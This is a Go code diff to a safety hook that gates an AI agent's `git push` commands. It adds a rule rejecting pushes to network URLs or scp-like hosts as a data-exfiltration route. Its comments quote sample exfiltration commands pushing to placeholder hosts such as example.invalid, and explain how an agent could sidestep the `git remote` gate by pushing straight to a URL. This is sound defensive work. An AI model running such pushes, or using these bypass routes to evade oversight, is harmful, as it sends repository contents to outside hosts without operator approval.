@@ -103,10 +103,11 @@ func (r *Rule) Evaluate(input *hookio.HookInput) hookio.RuleResult {
 // classify returns the base verdict for a git subcommand, independent of any
 // `-C` path-safety concern (which Evaluate layers on top via chdirSafe).
 func (r *Rule) classify(pc cmdparse.ParsedCommand, subcmd string, rest []string) hookio.RuleResult {
-	// push: the force / remote-ref-destroying spellings are REJECTED (pg2-bohpm,
-	// see pushVerdict for the ruling and the rationale). Every other push falls
-	// through to the modifying-subcommand Approve below, so ordinary pushes and
-	// same-branch --force-with-lease keep their verdict.
+	// push: the force / remote-ref-destroying spellings (pg2-bohpm) and a NETWORK
+	// destination given in place of a remote name (pg2-abb65) are REJECTED — see
+	// pushVerdict for both rulings and their rationale. Every other push falls
+	// through to the modifying-subcommand Approve below, so ordinary pushes, pushes
+	// to a LOCAL PATH, and same-branch --force-with-lease keep their verdict.
 	if subcmd == "push" {
 		if res, ok := r.pushVerdict(rest); ok {
 			return res
@@ -336,6 +337,7 @@ const (
 	minAbbrevForceWithLease = len("force-w") // same ambiguity one character shorter
 	minAbbrevDelete         = len("de")      // `--d` is ambiguous: --delete / --dry-run
 	minAbbrevMirror         = len("m")       // no other `git push` option starts with m
+	minAbbrevRepo           = len("rep")     // `--re` is ambiguous: --recurse-submodules / --receive-pack
 )
 
 // hasPushLongFlag reports whether args carries long flag name in any spelling
@@ -381,6 +383,113 @@ func pushShortFlagTokens(args []string) []string {
 	return out
 }
 
+// hasNetworkScheme reports whether tok is an explicit `<scheme>://…` URL naming a
+// destination that is NOT on this filesystem.
+//
+// The scheme is matched GENERICALLY rather than against an allowlist, so
+// `https`, `http`, `git`, `ssh` and the historical `git+ssh` / `ssh+git` forms are
+// all covered, as is any scheme a future git learns — an allowlist would silently
+// exempt whatever it omitted, which for a security gate is the wrong default.
+//
+// `file://` is the ONE exemption and it is deliberate: it names a path on this
+// filesystem, so it has the local-path properties described in
+// pushDestinationOffMachine, not the network ones. Matched case-insensitively
+// because git accepts the scheme in any case.
+func hasNetworkScheme(tok string) bool {
+	i := strings.Index(tok, "://")
+	if i <= 0 { // `i == 0` is "://…" with no scheme at all, not a URL
+		return false
+	}
+	return !strings.EqualFold(tok[:i], "file")
+}
+
+// isScpLikeURL reports whether tok is git's scp-like ssh syntax,
+// `[user@]host:path` — a NETWORK destination reached over ssh (measured
+// 2026-07-30: `GIT_SSH_COMMAND=… git push git@example.invalid:evil/x.git main`
+// invoked the ssh command, so this shape really does leave the machine).
+//
+// The test is git's own: a `:` that appears before any `/`. A token carrying an
+// explicit `<scheme>://` is excluded first, because otherwise `file:///tmp/x`
+// would match here (its first `:` precedes its first `/`) and defeat
+// hasNetworkScheme's file exemption.
+//
+// POSITION IS LOAD-BEARING. This shape is indistinguishable from a `src:dst`
+// REFSPEC (`main:other` reads as host `main`, path `other`), so it MUST be tested
+// only at the DESTINATION operand position, where git itself resolves it as a
+// URL. pushNetworkDestination never applies it to a later operand.
+func isScpLikeURL(tok string) bool {
+	if strings.Contains(tok, "://") {
+		return false // an explicit scheme; hasNetworkScheme owns this token
+	}
+	c := strings.IndexByte(tok, ':')
+	if c <= 0 {
+		return false
+	}
+	if s := strings.IndexByte(tok, '/'); s >= 0 && s < c {
+		return false // a path like /tmp/a:b — the colon is inside the path
+	}
+	return true
+}
+
+// pushDestinationOffMachine reports whether a `git push` DESTINATION token names
+// a host other than this machine.
+//
+// WHAT IS DELIBERATELY NOT MATCHED — and this is the regression-critical half.
+// Everything else falls through unchanged, which collapses two very different
+// spellings into one ungated class ON PURPOSE:
+//
+//   - A configured remote NAME (`origin`, `upstream`). Ungated because gating it
+//     is the whole verdict this rule already grants.
+//   - A LOCAL FILESYSTEM PATH (`/tmp/dst.git`, `./dst.git`, `../dst.git`,
+//     `~/dst.git`, `sub/dir`, and `file://…`). Ungated DELIBERATELY, for three
+//     reasons: (1) the exfiltration rationale that makes the network form a
+//     Reject does not apply — the objects never leave the filesystem; (2) whether
+//     a given directory may be WRITTEN is already patheval's question, asked by
+//     chdirSafe, not this rule's; (3) pushing between throwaway local repos is
+//     how the evidence in this very rule was measured (pg2-bohpm's
+//     --force-with-lease reproduction), so gating it would break the project's
+//     own fixtures and legitimate local work.
+//
+// A bare name can carry neither a `://` nor a pre-slash `:`, and a local path
+// carries a `/` before any `:`, so neither predicate can reach them.
+func pushDestinationOffMachine(tok string) bool {
+	return hasNetworkScheme(tok) || isScpLikeURL(tok)
+}
+
+// pushNetworkDestination returns the token by which a `git push` names a NETWORK
+// destination, and true when it does. refspecs is pushVerdict's already-computed
+// cmdparse.ClassifyPushRefspecs(rest), i.e. every operand AFTER the destination.
+//
+// It reads three places, because git accepts the destination in three:
+//
+//  1. The DESTINATION OPERAND (`git push <url> main`) — cmdparse.FirstOperand,
+//     which for `git push` is the repository, not a refspec. Both shapes are
+//     tested here, the only position where scp-like is unambiguous.
+//  2. `--repo=<url>`, which git documents as equivalent to the operand. Only the
+//     GLUED value needs its own read: in the SEPARATED form (`--repo <url>`) the
+//     value is already what FirstOperand returns, by the separated-value shift
+//     that primitive documents — so case 1 catches it.
+//  3. Any LATER operand carrying `://`. This exists to close that same shift in
+//     the other direction: `git push -o ci.skip <url> main` makes FirstOperand
+//     answer `ci.skip`, moving the URL into refspec position. Only the `://` test
+//     is applied here, never scp-like, because a refspec legitimately looks
+//     scp-like (`main:other`) whereas `://` is not a valid ref name in any
+//     position.
+func pushNetworkDestination(rest []string, refspecs []cmdparse.Refspec) (string, bool) {
+	if dest, _ := cmdparse.FirstOperand(rest); dest != "" && pushDestinationOffMachine(dest) {
+		return dest, true
+	}
+	if v, ok := hasPushLongFlag(rest, "repo", minAbbrevRepo); ok && v != "" && pushDestinationOffMachine(v) {
+		return v, true
+	}
+	for _, rs := range refspecs {
+		if hasNetworkScheme(rs.Raw) {
+			return rs.Raw, true
+		}
+	}
+	return "", false
+}
+
 // pushVerdict returns the verdict for a `git push` — rest being the args AFTER
 // the `push` subcommand — and false when the push is none of the prohibited
 // shapes, in which case classify lets it fall through to the ordinary modifying
@@ -401,6 +510,32 @@ func pushShortFlagTokens(args []string) []string {
 // WHAT WOULD JUSTIFY CHANGING IT: a new operator ruling. Needing one force push
 // is not one — publishing is operator-authorized anyway, so the operator can run
 // it themselves; relaxing any of these to Ask requires the ruling to change.
+//
+// A NETWORK DESTINATION IS ALSO REJECT (pg2-abb65, 2026-07-30). `git push` takes
+// a URL in place of a remote NAME, so before this gate `git push
+// https://example.invalid/x.git main` measured `allow`: an agent could send any
+// branch to any host, with no prompt, WITHOUT mutating `git remote` at all.
+//
+// REJECT RATHER THAN ASK, and the deciding argument is RELATIVE STRINGENCY, not
+// severity in the abstract. `git remote set-url` / `git remote add` are gated for
+// exactly this exfiltration rationale — a remote mutation silently redirects
+// where pushes land. Push-to-URL is the SAME vector with strictly fewer steps and
+// no persistent trace. An Ask here would therefore sit BELOW the control it is
+// meant to match: an agent refused the config mutation would simply push straight
+// to the URL and meet a prompt instead of a refusal, which closes the slow door
+// and leaves the fast one ajar. That inversion is the whole defect, so the gate
+// has to be at least as strict as the control it mirrors. Reject also leaves no
+// approvable spelling, which is the property that stops the "try the next
+// spelling" loop the force-push Rejects above were written to stop.
+//
+// THE COST OF REJECT IS NEAR ZERO HERE, which is what makes it proportionate: an
+// agent must not publish on its own initiative in the first place, so it has no
+// sanctioned reason to reach an arbitrary host. The remedies are both open —
+// configure a remote and push by NAME (which puts a person in the loop at the
+// `git remote` gate), or hand the push to the operator.
+//
+// LOCAL PATHS ARE NOT GATED. See pushDestinationOffMachine for the reasoning and
+// for why `file://` counts as local rather than as a URL.
 //
 // TEXT VS PARSED: every test here reads PARSED tokens (post-unquote
 // cmdparse.ParsedCommand.Args) and the rule runs only when
@@ -458,6 +593,31 @@ func (r *Rule) pushVerdict(rest []string) (hookio.RuleResult, bool) {
 		}
 	}
 
+	// NETWORK DESTINATION (pg2-abb65). See this function's doc comment for the
+	// Reject-not-Ask ruling and pushDestinationOffMachine for what counts.
+	//
+	// ORDER IS LOAD-BEARING, IN BOTH DIRECTIONS.
+	//
+	// AFTER the force / --mirror / --delete Rejects above: those are prohibited
+	// OPERATIONS whatever the destination, and their reasons name the operation and
+	// its remedy. Reaching them first leaves every pg2-bohpm verdict and reason
+	// string byte-identical, so a `--force` to a URL still reads as a force-push
+	// refusal — the accurate answer, since dropping the URL would not make it
+	// approvable.
+	//
+	// BEFORE the --force-with-lease block below, which is not optional. That block
+	// returns an ASK for a same-branch lease to any remote that is not `origin`,
+	// and a URL is by definition not `origin` — so placed after it, this gate would
+	// be SHADOWED for every `--force-with-lease <url> main` and the URL form would
+	// silently DOWNGRADE from Reject to Ask (measured on the pre-fix binary: `git
+	// push --force-with-lease https://example.invalid/x.git main` answered `ask`
+	// from that very branch). Ordering it first makes the two gates disjoint in
+	// practice: the non-origin Ask now only ever sees a NAMED remote, which is what
+	// it was written for.
+	if dest, ok := pushNetworkDestination(rest, refspecs); ok {
+		return reject("git: pushing to a URL is prohibited — " + dest + " is a network destination, not a configured remote, so this sends repository contents to an arbitrary host with no `git remote` change to show for it (pg2-abb65, 2026-07-30). It is refused for the same exfiltration reason `git remote set-url` is, and refused rather than prompted so it is not the cheaper way around that gate. Push to a configured remote by NAME, or hand the push to the operator")
+	}
+
 	// --force-with-lease: CROSS-BRANCH is Reject, SAME-BRANCH stays approvable.
 	//
 	// Cross-branch is a Reject on measured evidence (2026-07-30): pushing `main`
@@ -486,10 +646,14 @@ func (r *Rule) pushVerdict(rest []string) (hookio.RuleResult, bool) {
 				return reject("git: --force-with-lease onto a DIFFERENT remote branch is prohibited — refspec " + rs.Raw + " pushes to another ref, and the lease protects only the ref it NAMES (measured 2026-07-30: it force-updated the destination and destroyed its unique commit). Push to the same branch name instead")
 			}
 		}
-		// A non-origin remote keeps the Ask it has today. The lease is same-branch,
-		// so the ruling's Reject does not reach it, but nothing about pg2-bohpm
-		// justifies LOOSENING an existing Ask either — this rule's changes are
-		// one-directional.
+		// A non-origin NAMED remote keeps the Ask it has today. The lease is
+		// same-branch, so the ruling's Reject does not reach it, but nothing about
+		// pg2-bohpm justifies LOOSENING an existing Ask either — this rule's changes
+		// are one-directional. Since pg2-abb65 this branch no longer sees a URL
+		// destination: that is Rejected above, deliberately ordered ahead of here so
+		// this Ask cannot shadow it. FirstOperand's separated-value shift can still
+		// put a flag VALUE here (`--force-with-lease -o x main` reads `x` as the
+		// remote), which lands on the safe side — an Ask.
 		if remote, _ := cmdparse.FirstOperand(rest); remote != "" && remote != "origin" {
 			return hookio.RuleResult{
 				Decision: hookio.Ask,
